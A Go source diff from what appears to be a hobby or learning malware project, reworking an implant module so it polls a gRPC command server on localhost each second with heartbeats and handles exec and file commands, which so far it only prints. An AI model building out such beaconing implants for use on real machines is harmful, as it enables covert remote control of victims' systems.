@@ -5,24 +5,12 @@ import (
 	"fmt"
 	"log"
 	"malware/common"
-	"malware/common/types"
-	"strings"
-	"time"
-
 	pb "malware/common/messages"
+	"malware/common/types"
+	"time"
 
 	"google.golang.org/grpc"
 )
-
-// Message to be sent by
-type sendText struct {
-	text string
-}
-
-// SendText generates a `sendCommand` event message
-func SendText(args []string) types.Event {
-	return sendText{strings.Join(args, "\n")}
-}
 
 type state struct {
 	running      bool
@@ -32,12 +20,46 @@ type state struct {
 
 type settings struct {
 	state *state
-	ip    string
-	port  int16
+	host  string
+}
+
+func (settings settings) doConnection(conn *grpc.ClientConn) {
+	client := pb.NewMalwareClient(conn)
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+
+	heartbeat := &pb.CheckCmdRequest_Heartbeat{Heartbeat: time.Now().Unix()}
+
+	reply, err := client.CheckCommandQueue(ctx, &pb.CheckCmdRequest{Message: heartbeat})
+	if err != nil {
+		common.Panicf(err, "Sending heartbeat help broken")
+	}
+
+	switch u := reply.Message.(type) {
+	case *pb.CheckCmdReply_Heartbeat:
+		fmt.Println("Heartbeat", u.Heartbeat)
+	case *pb.CheckCmdReply_Exec:
+		fmt.Println("Exec reply", u.Exec)
+	case *pb.CheckCmdReply_File:
+		fmt.Println("Received file", u.File)
+	default:
+		common.Panic("Didn't receive a valid message", reply, u)
+	}
+
 }
 
 func (settings settings) listenServer() {
+	conn, err := grpc.Dial(settings.host, grpc.WithInsecure())
+	if err != nil {
+		log.Fatalf("fail to dial: %v", err)
+	}
+
+	defer conn.Close()
+
 	for settings.state.running {
+		settings.doConnection(conn)
+
+		time.Sleep(1 * time.Second)
 	}
 }
 
@@ -67,29 +89,15 @@ func Create() types.Module {
 	port := int16(2000)
 	ip := "127.0.0.1"
 	state := state{eventChannel: nil}
+	host := fmt.Sprintf("%s:%d", ip, port)
 
-	return settings{&state, ip, port}
-}
-
-func (settings settings) testConnection() {
-	host := fmt.Sprintf("%s:%d", settings.ip, settings.port)
-
-	conn, err := grpc.Dial(host, grpc.WithInsecure())
-
-	if err != nil {
-		log.Fatalf("fail to dial: %v", err)
-	}
-	defer conn.Close()
-	client := pb.NewImplantClient(conn)
-	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-	defer cancel()
-	fmt.Println(client.Exec(ctx, &pb.ExecRequest{Cmd: "ls"}))
+	return settings{&state, host}
 }
 
 func (settings settings) Init() chan types.Event {
 	settings.state.eventChannel = make(chan types.Event, 1)
 	settings.state.running = true
-	settings.testConnection()
+
 	go settings.listenServer()
 	go settings.runEvents()
 
